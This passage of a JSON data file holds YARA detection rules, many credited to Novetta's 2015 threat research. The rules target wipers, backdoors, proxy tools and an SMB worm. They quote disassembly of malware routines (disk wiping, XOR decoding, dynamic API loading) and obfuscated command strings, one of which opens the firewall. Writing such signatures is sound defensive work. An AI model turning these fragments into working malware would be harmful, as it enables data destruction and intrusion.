3Ch\n\t\t99              cdq\n\t\t59              pop     ecx\n\t\tF7 F9           idiv    ecx\n\t\t66 89 55 E6     mov     [ebp+SystemTime.wMinute], dx\n\t\tE8 E0 15 00 00  call    _rand\n\t\t6A 3C           push    3Ch\n\t\t99              cdq\n\t\t59              pop     ecx\n\t\tF7 F9           idiv    ecx\n\t*/\n\n\t$a = {66 89 55 DC E8 [4] 6A 0C \t99 59 F7 F9 42 66 89 55 DE E8 [4] 6A 1C 99 59 F7 F9 42 66 89 55 E2 E8 [4] 6A 18 99 59 F7 F9 66 89 55 E4 E8 [4] 6A 3C 99 59 F7 F9 66 89 55 E6 E8 [4] 6A 3C 99 59 F7 F9 }\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "WhiskeyDelta": "rule WhiskeyDelta\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group  trig@novetta.com\"\n\t\tSource = \"41badf10ef6f469dd1c3be201aba809f9c42f86ad77d7f83bc3895bfa289c635\"\n\n\tstrings:\n\t/*\n\t\tF3 A5           rep movsd\n\t\t8B 7C 24 30     mov     edi, [esp+28h+arg_4]\n\t\t85 FF           test    edi, edi\n\t\t7E 3A           jle     short loc_402018\n\t\t8B 74 24 2C     mov     esi, [esp+28h+arg_0]\n\t\t8A 44 24 08     mov     al, [esp+28h+var_20]\n\t\t53              push    ebx\n\t\t8A 4C 24 21     mov     cl, [esp+2Ch+var_B]\n\t\t8A 5C 24 2B     mov     bl, [esp+2Ch+var_1]\n\t\t32 C1           xor     al, cl\n\t\t8A 0C 32        mov     cl, [edx+esi]\n\t\t32 C3           xor     al, bl\n\t\t32 C8           xor     cl, al\n\t\t88 0C 32        mov     [edx+esi], cl\n\t\tB9 1E 00 00 00  mov     ecx, 1Eh\n\t\t8A 5C 0C 0C     mov     bl, [esp+ecx+2Ch+var_20]\n\t\t88 5C 0C 0D     mov     [esp+ecx+2Ch+var_1F], bl\n\t\t49              dec     ecx\n\t\t83 F9 FF        cmp     ecx, 0FFFFFFFFh\n\t\t7F F2           jg      short loc_402000\n\t\t42              inc     edx\n\t*/\n\n\t$decryption = {F3 A5 8B 7C 24 30 85 FF 7E ?? 8B 74 24 2C 8A 44 24 08 53 8A 4C 24 21 8A 5C 24 2B 32 C1 8A 0C 32 32 C3 32 C8 88 0C 32 B9 1E 00 00 00 8A 5C 0C 0C \t88 5C 0C 0D 49 \t83 F9 FF 7F ?? \t42 }\n\n\t$s1 = \"=====IsFile=====\" wide\n\t$s2 = \"=====4M=====\" wide\n\t$s3 = \"=====IsBackup=====\" wide\n\t\n\tcondition:\n\t\t2 of ($s*) \n\t\tor $decryption in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "SMB_Worm_Tool": "rule SMB_Worm_Tool\n{\n\t\n\tstrings:\t\n\t\t$STR1 = \"Global\\\\FwtSqmSession106829323_S-1-5-19\"\n\t\t$STR2 = \"EVERYONE\"\n\t\t$STR3 = \"y0uar3@s!llyid!07,ou74n60u7f001\"\n\t\t$STR4 = \"\\\\KB25468.dat\" \n\t\n\tcondition:\n\t\t( uint16(0) == 0x5A4D or \n\t\t  uint16(0) == 0xCFD0 or \n\t\t  uint16(0) == 0xC3D4 or \n\t\t  uint32(0) == 0x46445025 or \n\t\t  uint32(1) == 0x6674725C) \n\t\tand all of them\n}",
  "Lightweight_Backdoor1": "rule Lightweight_Backdoor1\n{\n\n\tstrings:\n\t\t$STR1 = \"NetMgStart\"\n\t\t$STR2 = \"Netmgmt.srg\"\n\t\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D) and all of them\n}",
  "LightweightBackdoor2": "rule LightweightBackdoor2\n{\n\tstrings:\n\t\t$STR1 = \"prxTroy\" ascii wide nocase\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "LightweightBackdoor3": "rule LightweightBackdoor3\n{\n\t\n\tstrings:\n\t\t$strl  = { C6 45 E8 64 C6 45 E9 61 C6 45 EA 79 C6 45 EB 69 C6 45 EC 70 C6 45 ED 6D C6 45 EE 72 C6 45 EF 2E C6 45 F0 74 C6 45 F1  62 C6 45 F2 6C } // 'dayipmr.tbl' being moved to ebp\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "LightweightBackdoor4": "rule LightweightBackdoor4\n{\n\tstrings:\t\n\t\t$strl  = { C6 45 F4 61 C6 45 F5 6E C6 45 F6 73 C6 45 F7 69 C6 45 F8 2E C6 45 F9 6E C6 45 FA 6C C6 45 FB 73 } // 'ansi.nls' being moved to ebp\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "LightweightBackdoor5": "rule LightweightBackdoor5\n{\n\tstrings:\n\t\t$strl  = { C6 45 F4 74 C6 45 F5 6C C6 45 F6 76 C6 45 F7 63 C6 45 F8 2E C6 45 F9 6E C6 45 FA 6C C6 45 FB 73 } // 'tlvc.nls' being moved to ebp\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "LightweightBackdoor6": "rule LightweightBackdoor6\n{\n\tstrings:\n\t\t$STR1 = { 8A 10 80 ?? 4E 80 ?? 79 88 10}\n\t\t$STR2 = { 8A 10 80?? 79 80 ?? 4E 88 10}\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "ProxyTool1": "rule ProxyTool1\n{\n\tstrings:\n\t\t$STR1 = \"pmsconfig.msi\" wide\n\t\t$STR2 = \"pmslog.msi\" wide\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them\n}",
  "ProxyTool2": "rule ProxyTool2\n{\nstrings:\n\t$STR1 = { 82 F4 DE D4 D3 C2 CA F5 C8 C8 D3 82 FB F4 DE D4 D3 C2 CA 94 95 FB D4 D1 C4 CF C8 D4 D3 89 C2 DF C2 87 8A CC 87 00 } // '%SystemRoot%\\System32\\svchost.exe -k' xor A7\n\ncondition:\n\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "ProxyTool3": "rule ProxyTool3\n{\n\tstrings:\n\t\t$STR2 = {8A 04 17 8B FB 34 A7 46 88 02 83 C9 FF}\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $STR2\n}",
  "DestructiveHardDriveTool1": "rule DestructiveHardDriveTool1\n{\n\tstrings:\n\t\t$str0= \"MZ\"\n\t\t$str1 = {c6 84 24 ?? ( 00 | 01 ) 00 00 }\n\t\t$xorInLoop = { 83 EC 20 B9 08 00 00 00 33 D2 56 8B 74 24 30 57 8D 7C 24 08 F3 A5 8B 7C 24 30 85 FF 7E 3A 8B 74 24 2C 8A 44 24 08 53 8A 4C 24 21 8A 5C 24 2B 32 C1 8A 0C 32 32 C3 32 C8 88 0C 32 B9 1E 00 00 00 8A 5C 0C 0C 88 5C 0C 0D 49 83 F9 FF 7F F2 42 88 44 24 0C 3B D7 7C D0 5B 5F 5E 83 C4 20 C3 }\n\t\n\tcondition:\n\t\t$str0 at 0 and $xorInLoop and #str1 > 300\n}",
  "DestructiveTargetCleaningTool1": "rule DestructiveTargetCleaningTool1\n{\n\tstrings:\n\t\t$s1  = {d3000000 [4] 2c000000 [12] 95000000 [4] 6a000000 [8] 07000000}\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and all of them\n}",
  "DestructiveTargetCleaningTool2": "rule DestructiveTargetCleaningTool2\n{\n\tstrings:\n\t\t$secureWipe = { 83 EC 34 53 55 8B 6C 24 40 56 57 83 CE FF 55 C7 44 24 2C D3 00 00 00 C7 44 24 30 2C 00 00 00 89 74 24 34 89 74 24   38 C7 44 24 3C 95 00 00 00 C7 44 24 40 6A 00 00 00 89 74 24 44 C7 44 24 14 07 00 00 00 FF 15 ?? ?? ?? ?? 3B C6 89 44 24 1C 0F 84 (D8 | d9) 01 00 00 33 FF 68 00 00 01 00 57 FF 15 ?? ?? ?? ?? 8B D8 3B DF 89 5C 24 14 0F 84 (BC | BD) 01 00 00 8B 44 24 1C A8 01 74 0A 24 FE 50 55 FF 15 ?? ?? ?? ?? 8B 44 24 4C 2B C7 74 20 48 74 0F 83 E8 02 75 1C C7 44 24 10 03 00 00 00 EB 12 C7 44 24 10 01 00 00 00 89 74 24 28 EB 04 89 7C 24 10 8B 44 24 10 89 7C 24 1C 3B C7 0F 8E ( 5C | 5d ) 01 00 00 8D 44 24 28 89 44 24 4C EB 03 83 CE FF 8B 4C 24 4C 8B 01 3B C6 74 17 8A D0 B9 00 40 00 00 8A F2 8B FB 8B C2 C1 E0 10 66 8B C2 F3 AB EB ( 13 | 14) 33 F6 (E8 | ff 15) ?? ?? ?? ?? 88 04 1E 46 81 FE 00 00 01 00 7C ( EF | ee) 6A 00 6A 00 6A 03 6A 00 6A 03 68 00 00 00 C0 55 FF 15 ?? ?? ?? ?? 8B F0 83 FE FF 0F 84 FA 00 00 00 8D 44 24 20 50 56 FF 15 ?? ?? ?? ?? 8B 2D ?? ?? ?? ?? 6A 02 6A 00 6A FF 56 FF D5 8D 4C 24 18 6A 00 51 6A 01 53 56 FF 15 ?? ?? ?? ?? 56 FF 15 ?? ?? ?? ?? 6A 00 6A 00 6A 00 56 FF D5 8B 44 24 24 8B 54 24 20 33 FF 33 DB 85 C0 7C 5A   7F 0A 85 D2 76 54 EB 04 8B 54 24 20 8B CA BD 00 00 01 00 2B CF 1B C3 85 C0 7F 0A 7C 04 3B CD 73 04 2B D7 8B EA 8B 44 24 14 8D 54 24 18 6A 00 52 55 50 56 FF 15 ?? ?? ?? ?? 8B 6C 24 18 8B 44 24 24 03 FD 83 D3 00 3B D8 7C BE 7F 08 8B 54 24 20 3B FA 72 B8 8B 2D ?? ?? ?? ?? 8B 5C 24 10 8B 7C 24 1C 8D 4B FF 3B F9 75 17 56 FF 15 ?? ?? ?? ?? 6A 00 6A 00 6A 00 56 FF D5 56 FF 15 ?? ?? ?? ?? 56 FF 15 ?? ?? ?? ?? 56 FF 15 ?? ?? ?? ?? 8B 4C 24 4C 8B 6C 24 48 47 83 C1 04 3B FB 8B 5C 24 14 89 7C 24 1C 89 4C 24 4C 0F 8C ( AE | AD) FE FF FF 6A 00 55 E8 ?? ?? ?? ?? 83 C4 08 53 FF 15 ?? ?? ?? ?? 5F 5E 5D 5B 83 C4 34 C3 }\n\t\n\tcondition:\n\t\t$secureWipe\n}",
  "DestructiveTargetCleaningTool3": "rule DestructiveTargetCleaningTool3\n{\n\t\n\tstrings:\n\t\t$S1_CMD_Arg = \"/install\" fullword\n\t\t$S2_CMD_Parse= \"\\\"%s\\\"  /install \\\"%s\\\"\" fullword\n\t\t$S3_CMD_Builder= \"\\\"%s\\\"  \\\"%s\\\" \\\"%s\\\" %s\" fullword\n\t\n\tcondition:\n\t\tall of them\n}",
  "DestructiveTargetCleaningTool4": "rule DestructiveTargetCleaningTool4\n{\n\n\tstrings:\n\t\t$BATCH_SCRIPT_LN1_0 = \"goto x\" fullword\n\t\t$BATCH_SCRIPT_LN1_1 = \"del\" fullword\n\t\t$BATCH_SCRIPT_LN2_0 = \"if exist\" fullword\n\t\t$BATCH_SCRIPT_LN3_0 = \":x\" fullword\n\t\t$BATCH_SCRIPT_LN4_0 = \"zz%d.bat\" fullword\n\t\n\tcondition:\n\t\t(#BATCH_SCRIPT_LN1_1 == 2) and all of them\n}",
  "DestructiveTargetCleaningTool5": "rule DestructiveTargetCleaningTool5\n{\n\tstrings:\n\t\t$MCU_DLL_ZLIB_COMPRESSED2 = { 5C EC AB AE 81 3C C9 BC D5 A5 42 F4 54 91 04 28 34 34 79 80 6F 71 D5 52 1E 2A 0D }\n\t\n\tcondition:\n\t\t$MCU_DLL_ZLIB_COMPRESSED2\n}",
  "DestructiveTargetCleaningTool6": "rule DestructiveTargetCleaningTool6\n{\n\tstrings:\n\t\t$MCU_INF_StartHexDec = {010346080A30D63633000B6263750A5052322A00103D1B570A30E67F2A00130952690A503A0D2A000E00A26E15104556766572636C7669642E657865}\n\t\t$MCU_INF_StartHexEnc = {6C3272386958BF075230780A0A54676166024968790C7A6779588F5E47312739310163615B3D59686721CF5F2120263E1F5413531F1E004543544C55}\n\t\n\tcondition:\n\t\t$MCU_INF_StartHexEnc or $MCU_INF_StartHexDec\n}",
  "DestructiveTargetCleaningTool7": "rule DestructiveTargetCleaningTool7\n{\n\tstrings:\n\t\t$a = \"SetFilePointer\"\n\t\t$b = \"SetEndOfFile\"\n\t\t$c = {75 17 56 ff 15 ?? ?? ?? ?? 6a 00 6a 00 6a 00 56 ff D5 56 ff 15 ?? ?? ?? ?? 56}\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and all of them\n}",
  "DestructiveTargetCleaningTool8": "rule DestructiveTargetCleaningTool8\n{\n\tstrings:\n\t\t$license = {E903FFFF820050006F007200740069006F006E007300200063006F007000790072006900670068007400200052006F006200650072007400200064006500200042006100740068002C0020004A006F007200690073002000760061006E002000520061006E007400770069006A006B002C002000440065006C00690061006E000000000000000250000000000A002200CE000800EA03FFFF8200}\n\t\t$PuTTY= {50007500540054005900}\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $license and not $PuTTY\n}",
  "Malwareusedbycyberthreatactor1": "rule Malwareusedbycyberthreatactor1\n{\n\tstrings:\n\t\t// vvv---- this sig hits on a legit CRT function it seems. \n\t\t$heapCreateFunction_0 = {33C06A003944240868001000000F94C050FF15????????85C0A3???????07436E893FEFFFF83F803A3???????0750D68F8030000E8??00000059EB0A83F8027518E8????000085C0750FFF35???????0FF15???????033C0C36A0158C3}\n\t\t\n\t\t$heapCreateFunction = { 55 8B EC B8 2C 12 00 00 E8 ?? ?? FF FF 8D 85 68 FF FF FF 53 50 C7 85 68 FF FF FF 94 00 00 00 FF 1? ?? ?? ?? ?0 85 C0 74 1A 83 BD 78 FF FF FF 02 75 11 83 BD 6C FF FF FF 05 72 08 6A 01 58 E9 02 01 00 00 8D 85 D4 ED FF F6 89 01 00 00 05 06 8? ?? ?? ?? 0F F1 5? ?? ?? ?? 08 5C 00 F8 4D 00 00 00 03 3D B8 D8 DD 4E DF FF F3 89 DD DF FF F7 41 38 A0 13 C6 17 C0 83 C7 A7 F0 42 C2 08 80 14 13 81 97 5E D8 D8 5D 4E DF FF F6 A1 65 06 8? ?? ?? ?? 0E 8? ?? ?0 00 08 3C 40 C8 5C 07 50 88 D8 5D 4E DF FF FE B4 98 D8 56 4F EF FF F6 80 40 10 00 05 05 3F F1 5? ?? ?? ?? 03 89 D6 4F EF FF F8 D8 D6 4F EF FF F7 41 38 A0 13 C6 17 C0 83 C7 A7 F0 42 C2 08 80 14 13 81 97 5E D8 D8 56 4F EF FF F5 08 D8 5D 4E DF FF F5 0E 8? ?? ?? ?? ?5 95 93 BC 37 43 E6 A2 C5 0E 8? ?? ?? ?? ?5 93 BC 35 97 43 04 08 BC 83 81 87 40 E8 03 93 B7 50 48 81 9E B0 14 13 81 97 5F 26 A0 A5 35 0E 8? ?? ?0 00 08 3C 40 C8 3F 80 27 41 D8 3F 80 37 41 88 3F 80 17 41 38 D4 5F C5 0E 89 8F EF FF F8 07 DF C0 65 91 BC 08 3C 00 35 BC 9C}\n\t\t\n  \t// vvv---- this sig hits on a legit CRT function it seems. \n\t\t$getMajorMinorLinker = {568B7424086A00832600FF15???????06681384D5A75148B483C85C9740D03C18A481A880E8A401B8846015EC3}\n\n\t\t$openServiceManager = {FF15???0?0?08B?885??74????????????????5?FF15???0?0?08B?????0?0?08BF?85F?74}\n\t\n\tcondition:\n\t\n\t\tall of them\n}",
  "Malwareusedbycyberthreatactor2": "rule Malwareusedbycyberthreatactor2\n{\n\tstrings:\n\t\t$str1 = \"_quit\"\n\t\t$str2 = \"_exe\"\n\t\t$str3 = \"_put\"\n\t\t$str4 = \"_got\"\n\t\t$str5 = \"_get\"\n\t\t$str6 =\"_del\"\n\t\t$str7 = \"_dir\"\n\t\t$str8 = { C7 44 24 18 1F F7}\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0  or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "Malwareusedbycyberthreatactor3": "rule Malwareusedbycyberthreatactor3\n{\n\tstrings:\n\t\t$STR1 = { 50 68 80 00 00 00 68 FF FF 00 00 51 C7 44 24 1C 3a 8b 00 00 }\n\t\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "wiper_unique_strings": "rule wiper_unique_strings\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t \tcompany = \"novetta\"\n\n\t strings:\n\t \t$a = \"C!@I#%VJSIEOTQWPVz034vuA\"\n\t\t$b = \"BAISEO%$2fas9vQsfvx%$\"\n\t\t$c = \"1.2.7.f-hanba-win64-v1\"\n\t\t$d = \"md %s&copy %s\\\\*.* %s\"\n\t\t$e = \"%sd.e%sc n%ssh%srewa%s ad%s po%sop%sing T%s %d \\\"%s\\\"\"\n\t\t$f = \"Ge.tVol. .umeIn..for  mati.onW\"\n\t\n\tcondition:\n\t\t$a or $b or $c or $d or $e or $f\n}",
  "wiper_encoded_strings": "rule wiper_encoded_strings\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n \t\tcompany = \"novetta\"\n\n\t strings:\n\t \t$scr = {89 D4 C4 D5 00 00 00}\n\t \t$explorer = {E2 DF D7 CB C8 D5 C2 D5 89 C2 DF C2 00 00 00 }\n\t \t$kernel32 = {CC C2 D5 C9 C2 CB 94 95  89 C3 CB CB 00 00 }\n\n\tcondition:\n\t\t$scr or $explorer or $kernel32 \n}",
  "createP2P": "rule createP2P\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"CreatP2P Thread\" wide\n\n\tcondition:\n\t\tany of them\n}",
  "firewallOpener": "rule firewallOpener\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t $ = \"%sd.e%sc n%ssh%srewa%s ad%s po%sop%sing T%s %d \\\"%s\\\"\"\n\t \n\tcondition:\n\t\tany of them\n\t\t\n}",
  "Caracachs": "rule Caracachs: sharedcode\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"eff542ac8e37db48821cb4e5a7d95c044fff27557763de3a891b40ebeb52cc55.ex_\"\n\n\tstrings:\n\t/*\n\t\tB9 10 00 00 00     mov     ecx, 10h        ; ecx = 16\n\t\t8B 06              mov     eax, [esi]      ; eax = lastValue\n\t\tC1 EA 10           shr     edx, 10h        ; edx = val >> 16\n\t\t81 E2 FF 7F 00 00  and     edx, 7FFFh      ; edx = (val >> 16) & 0x7FFF\n\t\t03 C2              add     eax, edx        ; eax = ((val >> 16) & 0x7FFF) + lastValue\n\t\t8B D0              mov     edx, eax        ; edx = ((val >> 16) & 0x7FFF) + lastValue\n\t\t8B F8              mov     edi, eax        ; edi = ((val >> 16) & 0x7FFF) + lastValue\n\t\t83 E2 0F           and     edx, 0Fh        ; edx = (((val >> 16) & 0x7FFF) + lastValue) & 0xF\n\t\t2B CA              sub     ecx, edx        ; ecx = 16 - ((((val >> 16) & 0x7FFF) + lastValue)) & 0xF\n\t\tD3 EF              shr     edi, cl         ; edi = (((val >> 16) & 0x7FFF) + lastValue) >> ((16 - ((val >> 16) & 0x7FFF) + lastValue) & 0xF)\n\t\t8B CA              mov     ecx, edx        ; ecx = (((val >> 16) & 0x7FFF) + lastValue) & 0xF\n\t\tD3 E0              shl     eax, cl         ; eax = (((val >> 16) & 0x7FFF) + lastValue) << ((((val >> 16) & 0x7FFF) + lastValue) & 0xF)\n\t\t0B F8              or      edi, eax        ; edi = (((val >> 16) & 0x7FFF) + lastValue) >> ((16 - ((val >> 16) & 0x7FFF) + lastValue) & 0xF) | (((val >> 16) & 0x7FFF) + lastValue) << ((((val >> 16) & 0x7FFF) + lastValue) & 0xF)\n\t\t89 3E              mov     [esi], edi      ; pLastValue = (((val >> 16) & 0x7FFF) + lastValue) >> ((16 - ((val >> 16) & 0x7FFF) + lastValue) & 0xF) | (((val >> 16) & 0x7FFF) + lastValue) << ((((val >> 16) & 0x7FFF) + lastValue) & 0xF)\n\t*/\n\n\t$a = {B? 10 00 00 00 8B ?? C1 ?? 10 81 ?? FF 7F 00 00 03 ?? 8B ?? 8B ?? 83 ?? 0F 2B ?? D3 ?? 8B ?? D3 ?? 0B ?? \t89 ?? \t}\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "StringDotSimplified": "rule StringDotSimplified: sharedcode\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"eff542ac8e37db48821cb4e5a7d95c044fff27557763de3a891b40ebeb52cc55.ex_\"\n\n\tstrings:\n\t/*\n\t\tF3 AB     rep stosd\n\t\t80 3A 00  cmp     byte ptr [edx], 0\n\t\t74 15     jz      short loc_404170\n\t\t8A 02     mov     al, [edx]\n\t\t3C 2E     cmp     al, 2Eh\n\t\t74 07     jz      short loc_404168\n\t\t3C 20     cmp     al, 20h\n\t\t74 03     jz      short loc_404168\n\t\t88 06     mov     [esi], al\n\t\t46        inc     esi\n\t*/\n\n\t$a = {\tF3 AB \t80 ?? 00 \t74 ?? \t8A 02 \t3C 2E \t74 ?? \t3C 20 \t74 ?? \t88 06 \t46 }\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "FakeTLS_ServerHelloGetSelectedCipher": "rule FakeTLS_ServerHelloGetSelectedCipher: sharedcode\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"eff542ac8e37db48821cb4e5a7d95c044fff27557763de3a891b40ebeb52cc55.ex_\"\n\n\tstrings:\n\t/*\n\t\t24 10           and     al, 10h\n\t\t0C 10           or      al, 10h\n\t\t89 07           mov     [edi], eax\n\t\t66 8B 44 24 14  mov     ax, [esp+0Ch+wCipherSuiteID]\n\t\t66 3D 00 C0     cmp     ax, 0C000h\n\t\t73 34           jnb     short loc_4067C1\n\t\t66 2D 35 00     sub     ax, 35h\n\t\t66 F7 D8        neg     ax\n\t\t1B C0           sbb     eax, eax\n\t\t24 80           and     al, 80h\n\t\t05 00 01 00 00  add     eax, 100h\n\t\t8B D8           mov     ebx, eax\n\t\t53              push    ebx             ; hostshort\n\t*/\n\n\t$a = {\t24 10 \t0C 10 \t89 ?? \t66 8? [3] 66 3? 00 C0 73 ?? 66 2? 35 00 66 F7 ?? 1B ?? \t2? 80 0? 00 01 00 00 8B ?? 5? }\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "XORDecodeA7": "rule XORDecodeA7: sharedcode\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"eff542ac8e37db48821cb4e5a7d95c044fff27557763de3a891b40ebeb52cc55.ex_\"\n\n\tstrings:\n\t/*\n\t\t8A 04 17  mov     al, [edi+edx]\n\t\t8B FB     mov     edi, ebx\n\t\t34 A7     xor     al, 0A7h\n\t\t46        inc     esi\n\t\t88 02     mov     [edx], al\n\t\t83 C9 FF  or      ecx, 0FFFFFFFFh\n\t\t33 C0     xor     eax, eax\n\t\t42        inc     edx\n\t\tF2 AE     repne scasb\n\t\tF7 D1     not     ecx\n\t\t49        dec     ecx\n\t\t3B F1     cmp     esi, ecx\n\t*/\n\n\t$a = {\t8A [2] \t8B ??\t34 A7 \t46 88 ?? 83 ?? FF 33 ?? 4? F2 AE F7 ?? \t4? 3B ?? }\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "DynamicAPILoading": "rule DynamicAPILoading: sharedcode\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"eff542ac8e37db48821cb4e5a7d95c044fff27557763de3a891b40ebeb52cc55.ex_\"\n\n\tstrings:\n\t/*\n\t\t83 C4 04           add     esp, 4\n\t\t50                 push    eax             ; lpProcName\n\t\t56                 push    esi             ; hModule\n\t\tFF 15 20 F0 40 00  call    ds:GetProcAddress\n\t\t68 A8 0C 41 00     push    offset aLo_adlIbr_arYw; \"Lo.adL ibr.ar yW\"\n\t\tA3 DC 3E 41 00     mov     GetProcAddress_0, eax\n\t\tE8 7D FF FF FF     call    CleanupString\n\t\t83 C4 04           add     esp, 4\n\t\t50                 push    eax             ; _DWORD\n\t\t56                 push    esi             ; _DWORD\n\t\tFF 15 DC 3E 41 00  call    GetProcAddress_0\n\t\t68 94 0C 41 00     push    offset aLoad_LibR_arYa; \"Load. Lib r.ar yA\"\n\t\tA3 D4 3E 41 00     mov     LoadLibraryW, eax\n\t\tE8 63 FF FF FF     call    CleanupString\n\t\t83 C4 04           add     esp, 4\n\t\t50                 push    eax             ; _DWORD\n\t\t56                 push    esi             ; _DWORD\n\t\tFF 15 DC 3E 41 00  call    GetProcAddress_0\n\t\t68 80 0C 41 00     push    offset a_frE_eliBr_arY; \".Fr e.eLi br.ar y\"\n\t\tA3 D8 3E 41 00     mov     LoadLibraryA_0, eax\n\t\tE8 49 FF FF FF     call    CleanupString\n\t*/\n\n\t$a = {\t83 C4 ?? 5? 5? \tFF 15 [4] 68 [4] A3 [4]\tE8 [4]\t83 C4 ?? 5? 5? \tFF 15 [4] 68 [4] A3 [4]\tE8 [4] 83 C4 ?? 5?  5? \tFF 15 [4] 68 [4] A3 [4]\tE8}\n\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "DNSCalcStyleEncodeAndDecode": "rule DNSCalcStyleEncodeAndDecode: sharedcode\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"975522bc3e07f7aa2c4a5457e6cc16c49a148b9f731134b8971983225835577e\"\n\n\tstrings:\n\t/*\n\t\t8A 10     mov     dl, [eax]\n\t\t80 F2 73  xor     dl, 73h\t\t\t\t\t<--- for decoding and encoding, this and\n\t\t80 EA 3A  sub     dl, 3Ah\t\t\t\t\t<--- this could be reversed, but the sig holds since both are 0x80\n\t\t88 10     mov     [eax], dl\n\t\t40        inc     eax\n\t\t49        dec     ecx\n\t\t75 F2     jnz     short loc_1000403C\n\t*/\n\n\t$a = {8A ?? 80 ?? ?? 80 ?? ?? 88 ?? 4? 4? 75 ?? }\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
